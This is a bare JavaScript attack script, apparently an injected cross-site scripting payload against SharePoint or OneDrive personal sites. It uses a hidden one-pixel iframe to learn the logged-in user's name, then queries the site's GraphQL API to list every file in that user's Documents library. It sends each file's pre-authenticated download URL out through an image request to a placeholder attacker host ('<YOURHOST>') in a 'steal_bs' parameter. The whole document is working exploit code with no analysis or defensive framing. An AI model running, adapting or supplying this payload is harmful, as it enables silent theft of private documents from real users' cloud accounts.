document.write("<iframe src='/' id='whoareu' border=0 width=1 height=1></iframe>");const myTimeout = setTimeout(whoareu, 5000);
function whoareu() {
  var theurl=document.getElementById('whoareu').contentWindow.location.href;
  user = new URL(theurl).pathname.split('/')[2];
  var attack="/personal/"+user+"/_api/v2.1/graphql";
  startHack(attack,user);
}


function getAuthURL(url){
    var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("GET", url);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		var myArr = this.responseText;
    		getAuth(myArr);
  		}
	};

	xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	xmlhttp.send();
}

function getAuth(arr){
    var x=JSON.parse(arr);
    document.writeln("<img src='https://<YOURHOST>/tiny.png?steal_bs="+x['@content.downloadUrl']+"'>");
}

function startHack(target,user){
    var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("POST", target);
	xmlhttp.onreadystatechange = function() {
  	if (this.readyState == 4 && this.status == 200) {
    		var myArr = this.responseText;
    		getFilesFolders(myArr);
  		}
	};

	xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    var s = JSON.stringify({"query":"query (        $listServerRelativeUrl: String!,$renderListDataAsStreamParameters: RenderListDataAsStreamParameters!,$renderListDataAsStreamQueryString: String!        )      {            legacy {            renderListDataAsStream(      listServerRelativeUrl: $listServerRelativeUrl,      parameters: $renderListDataAsStreamParameters,      queryString: $renderListDataAsStreamQueryString      )    }              perf {    executionTime    overheadTime    parsingTime    queryCount    validationTime    resolvers {      name      queryCount      resolveTime      waitTime    }  }    }","variables":{"listServerRelativeUrl":"/personal/"+user+"/Documents","renderListDataAsStreamParameters":{"renderOptions":5445383,"allowMultipleValueFilterForTaxonomyFields":true,"addRequiredFields":true},"renderListDataAsStreamQueryString":"@a1='%2Fpersonal%2F"+user.replaceAll('_','%5F')+"%2FDocuments'&TryNewExperienceSingle=TRUE"}});
	xmlhttp.send(s);
}

function getFilesFolders(arr) {
  arr = JSON.parse(arr);
  for (var x in arr["data"].legacy.renderListDataAsStream.ListData.Row){
      y=arr["data"].legacy.renderListDataAsStream.ListData.Row[x];
      getAuthURL(y['.spItemUrl']);
}}